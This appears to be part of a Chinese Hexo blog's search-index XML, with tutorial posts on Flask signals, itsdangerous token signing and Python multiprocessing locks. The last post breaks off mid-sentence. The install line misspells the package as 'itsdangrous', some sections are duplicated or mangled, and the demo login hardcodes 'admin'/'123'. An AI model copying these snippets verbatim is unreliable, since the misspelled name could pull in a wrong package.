中.这个函数很有用,可以利用它来记录视图函数异常日志,</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>template_rendered<span class="token punctuation">,</span>got_request_exceptionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">template_rendered_func</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span>template<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sender:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'context:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'template:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">)</span>template_rendered<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>template_rendered_func<span class="token punctuation">,</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 处理接受视图函数异常</span><span class="token keyword">def</span> <span class="token function">got_request_exception_func</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span>exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'exception.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'{sender}:{exception} \r\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sender<span class="token operator">=</span>sender<span class="token punctuation">,</span>exception<span class="token operator">=</span>exception<span class="token punctuation">)</span><span class="token punctuation">)</span>got_request_exception<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>got_request_exception_func<span class="token punctuation">,</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>127.0.0.1:5000</code> 后,会在当前文件夹下生成<code>exception.txt</code></p><pre class="line-numbers language-bash"><code class="language-bash">❯ <span class="token function">cat</span> exception.txt<span class="token operator">&lt;</span>Flask <span class="token string">'app'</span><span class="token operator">></span>:division by zero <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更多的方法<a href="http://flask.palletsprojects.com/en/1.1.x/api/#core-signals-list" target="_blank" rel="noopener">参照官网</a></p></blockquote><h3 id="4-利用blinker-设置登录日志信号"><a href="#4-利用blinker-设置登录日志信号" class="headerlink" title="4.利用blinker 设置登录日志信号"></a>4.利用<code>blinker</code> 设置登录日志信号</h3><blockquote><p>项目</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">.</span>├── app.py├── app_siangels.py├── log.txt├── static└── templates├── index.html└── login.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>request<span class="token punctuation">,</span>g<span class="token keyword">from</span> app_signals <span class="token keyword">import</span> login_signalapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'TEMPLATE_AUTO_RELOAD'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 假设数据库文件</span>login <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123'</span><span class="token punctuation">}</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>  username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>  g<span class="token punctuation">.</span>username <span class="token operator">=</span> username  password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>  <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">==</span> <span class="token string">'123'</span><span class="token punctuation">:</span>      login_signal<span class="token punctuation">.</span>send<span class="token punctuation">(</span>app<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">'login successful'</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app_signals.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> blinker <span class="token keyword">import</span> Namespace<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>g<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token comment" spellcheck="true"># 1.创建信号</span>myspace <span class="token operator">=</span> Namespace<span class="token punctuation">(</span><span class="token punctuation">)</span>login_signal <span class="token operator">=</span> myspace<span class="token punctuation">.</span>signal<span class="token punctuation">(</span><span class="token string">'login_signal'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.响应信号</span><span class="token keyword">def</span> <span class="token function">login_log</span><span class="token punctuation">(</span>sender<span class="token punctuation">)</span><span class="token punctuation">:</span>username<span class="token operator">=</span> g<span class="token punctuation">.</span>usernamenow <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addrlog <span class="token operator">=</span> <span class="token string">"用户名:{},登录时间:{},ip地址:{}.\r\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">,</span>now<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'log.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>  fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log<span class="token punctuation">)</span>    login_signal<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>login_log<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>html</code> 文档</p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--login.html--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>用户名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>username<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>密码:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问即可得到日志文件<code>log.txt</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-21/1603288807365-10322.png" alt="10322"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask签名认证</title>
      <link href="/posts/1501.html"/>
      <url>/posts/1501.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-29/1603973609698-10326.png" alt="10326"></p><h2 id="itsdangerous"><a href="#itsdangerous" class="headerlink" title="itsdangerous"></a><code>itsdangerous</code></h2><blockquote><p>一般在网站中使用<code>cookie\session</code>来处理用户登录等权限问题,有时也会使用<code>token</code>的方式.每次用户发出需要身份认证的请求时,就需要验证一次<code>token</code>是否生效,这就会涉及到签名的问题,在向不可信的环境中发送数据时,确保数据经过签名,并且只有自己有秘钥.</p><p><code>itsdangerous</code>这个插件包含了很多验证的方案.使用<code>HMAC\SHA1</code>来签名,支持<code>JSON WEB SIGNATURE(JWS)</code>.</p></blockquote><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><blockquote><pre class="line-numbers language-python">$ pip install itsdangrous</code></pre><p>官网(<code>https://itsdangerous.palletsprojects.com/en/1.1.x/</code>)</p></blockquote><h3 id="2-得定字符串签名"><a href="#2-得定字符串签名" class="headerlink" title="2.得定字符串签名"></a>2.得定字符串签名</h3><blockquote><p>发送方和接收方拥有相同的秘钥.发送方使用秘钥对内容进行签名,接收方使用相同的秘钥对内容进行验证.</p><pre><code class="python"><code class="language-python">$ pip install itsdangrous</code></pre><p>官网(<code>https://itsdangerous.palletsprojects.com/en/1.1.x/</code>)</p></blockquote><h3 id="2-得定字符串签名"><a href="#2-得定字符串签名" class="headerlink" title="2.得定字符串签名"></a>2.得定字符串签名</h3><blockquote><p>发送方和接收方拥有相同的秘钥.发送方使用秘钥对内容进行签名,接收方使用相同的秘钥对内容进行验证.</p><pre><code class="python">>>> from itsdangerous import Signer>>> s = Signer('secret-key')>>> s.sign('my string')'my string.wh6tMHxLgJqB6oY1uT73iMlyrOA'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>签名后字符串使用<code>.</code>分割,验证使用<code>unsign</code></p><pre class="line-numbers language-python">&gt;&gt;&gt; s.unsign(&#39;my string.wh6tMHxLgJqB6oY1uT73iMlyrOA&#39;)</code></pre><p>上文给出的<code>secret-key</code>是一个随意的字符串,如果你需要更无序的字符串,可以使用<code>os.urandom</code></p></blockquote><h3 id="3-带时间戳的签名"><a href="#3-带时间戳的签名" class="headerlink" title="3.带时间戳的签名"></a>3.带时间戳的签名</h3><blockquote><p>如果要有时效性的签名,,可以带上时间信息</p><pre><code class="python"><code class="language-python">&gt;&gt;&gt; s.unsign(&#39;my string.wh6tMHxLgJqB6oY1uT73iMlyrOA&#39;)</code></pre><p>上文给出的<code>secret-key</code>是一个随意的字符串,如果你需要更无序的字符串,可以使用<code>os.urandom</code></p></blockquote><h3 id="3-带时间戳的签名"><a href="#3-带时间戳的签名" class="headerlink" title="3.带时间戳的签名"></a>3.带时间戳的签名</h3><blockquote><p>如果要有时效性的签名,,可以带上时间信息</p><pre><code class="python">>>> from itsdangerous import TimestampSigner>>> s = TimestampSigner('secret-key')>>> string = s.sign('foo')foo.DlGDsw.dpJ37ffyfNAVufH21lH_yoelnKA>>> s.unsign(string, max_age=5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-序列化"><a href="#4-序列化" class="headerlink" title="4.序列化"></a>4.序列化</h3><blockquote><p><code>Serializer</code>提供了一个<code>dumps/loads</code>接口,类似与<code>python</code>的<code>json</code>模块,该接口将对象序列化为字符串,然后进行签名.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> Serializer<span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> Serializer<span class="token punctuation">(</span><span class="token string">'secret-key'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token string">'[1, 2, 3, 4].r7R9RhGgDPvvWl3iNzLuIIfELmo'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="1-带时间戳的序列化"><a href="#1-带时间戳的序列化" class="headerlink" title="1.带时间戳的序列化"></a>1.带时间戳的序列化</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> TimedSerializer<span class="token operator">>></span><span class="token operator">></span> s<span class="token operator">=</span>TimedSerializer<span class="token punctuation">(</span><span class="token string">'secret-key'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> string <span class="token operator">=</span> s<span class="token punctuation">.</span>sign<span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>unsign<span class="token punctuation">(</span>string<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-URL安全序列化"><a href="#2-URL安全序列化" class="headerlink" title="2.URL安全序列化"></a>2.<code>URL</code>安全序列化</h4><blockquote><p>如果加密后的字符串需要在<code>URL</code>中传输,可以使用这种方式.常见的是在邮箱中验证<code>token</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> URLSafeSerializer<span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> URLSafeSerializer<span class="token punctuation">(</span><span class="token string">'secret-key'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token string">'WzEsMiwzLDRd.wSPHqC0gR7VUqivlSukJ0IeTDgo'</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token string">'WzEsMiwzLDRd.wSPHqC0gR7VUqivlSukJ0IeTDgo'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-JSON-WEB-SIGNATURE"><a href="#3-JSON-WEB-SIGNATURE" class="headerlink" title="3.JSON WEB SIGNATURE"></a>3.<code>JSON WEB SIGNATURE</code></h4><blockquote><p><code>JWS</code>是一种基于<code>JSON</code>数据结构的签名的算法规范.详细规定请<a href="http://self-issued.info/docs/draft-ietf-jose-json-web-signature.html" target="_blank" rel="noopener">点击</a></p><p><code>itsdangerous</code>基于<code>JWS</code>实现了<code>URL</code>安全序列化</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> TimedJSONWebSignatureSerializer <span class="token keyword">as</span> Serializers <span class="token operator">=</span> Serializer<span class="token punctuation">(</span><span class="token string">'secret-key'</span><span class="token punctuation">,</span> expires_in<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># exprs_in是过期时间</span>s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># user 为 model 中封装过的对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-在Flask中使用"><a href="#5-在Flask中使用" class="headerlink" title="5.在Flask中使用"></a>5.在<code>Flask</code>中使用</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> TimedJSONWebSignatureSerializer <span class="token keyword">as</span> Serializer<span class="token keyword">from</span> config <span class="token keyword">import</span> config<span class="token keyword">def</span> <span class="token function">gen_token</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> expiration<span class="token operator">=</span><span class="token number">1440</span><span class="token operator">*</span><span class="token number">31</span><span class="token operator">*</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 单位为秒，设定 31 天过期</span>   s <span class="token operator">=</span> Serializer<span class="token punctuation">(</span>config<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">,</span> expires_in<span class="token operator">=</span>expiration<span class="token punctuation">)</span>   <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># user 为 model 中封装过的对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>装饰器</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">def</span> <span class="token function">token_required</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>   @wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>       token <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>       s <span class="token operator">=</span> Serializer<span class="token punctuation">(</span>config<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">)</span>       <span class="token keyword">try</span><span class="token punctuation">:</span>           data <span class="token operator">=</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>token<span class="token punctuation">)</span>       <span class="token keyword">except</span> SignatureExpired<span class="token punctuation">:</span>           <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'fail'</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'expired token'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>       <span class="token keyword">except</span> BadSignature<span class="token punctuation">:</span>           <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'fail'</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'useless token'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>       kwargs<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>       <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>   <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-21/1603288807365-10322.png" alt="10322"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:使用同步原语数据交换</title>
      <link href="/posts/13617.html"/>
      <url>/posts/13617.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="使用同步原语数据交换"><a href="#使用同步原语数据交换" class="headerlink" title="使用同步原语数据交换"></a>使用同步原语数据交换</h2><blockquote><p>多个进程可以协同工作来完成一项任务,通常需要共享数据,python可以通过<code>queue</code>和<code>pipe</code>的方式共享数据,那么在多进程之间保持数据的一致性,就很重要了.</p><p>需要共享数据协同的进程必须以适当的策略来读写数据.相关的同步原语和线程的库很类似.</p><p>进程的同步原语如下:</p><ul><li><p><code>Lock</code>:原始锁,一旦一个进程或者线程拿到了锁,后续的其他进程或线程的其他请求都会被阻塞知道锁被释放.进程对象有2种状态=&gt;<code>Locked\Unlocked</code>(加锁\未加锁),一个加锁的对象有2种方法</p><ul><li><code>acquire(block=True, timeout=None)</code> :获取锁,阻塞或非阻塞的.如果<code>block</code>参数为<code>True</code>(默认值),对该方法的调用在锁处于<code>release()</code> 之前都会阻塞,然后将锁设置为锁住状态并返回<code>True</code>,如果<code>block</code>为<code>False</code>,方法的调用将不会阻塞,如果锁当前处于锁住状态,返回<code>False</code>,否则将锁设置为锁住状态,并返回<code>True</code></li><li><code>release()</code> :释放锁,可以在任何进程,线程中使用,并不限于锁的拥有者,当尝试是一个没有被持有的锁时,会抛出<code>ValueError</code></li></ul></li><li><p><code>RLock</code> :递归锁,递归锁必须由持有线程,进程亲自释放.如果某个进程或者线程拿到了递归锁,这个进程或者线程可以再次拿到这个锁而不需要等待.但是这个进程或者线程的拿锁操作和释放锁操作的次数必须相同.</p><ul><li><code>acquire(block=True,timeout=None)</code>:获取锁,阻塞或非阻塞的.当 <code>block=True</code> 时,会一直阻塞直到锁处于空闲状态(没有被任何进程线程拥有),除非当前进程或线程已经拥有了这把锁.然后当前进程/线程会持有这把锁(在锁没有其他持有者的情况下),锁内部的递归等级加一,并返回<code>True</code> .<code>block=False</code> 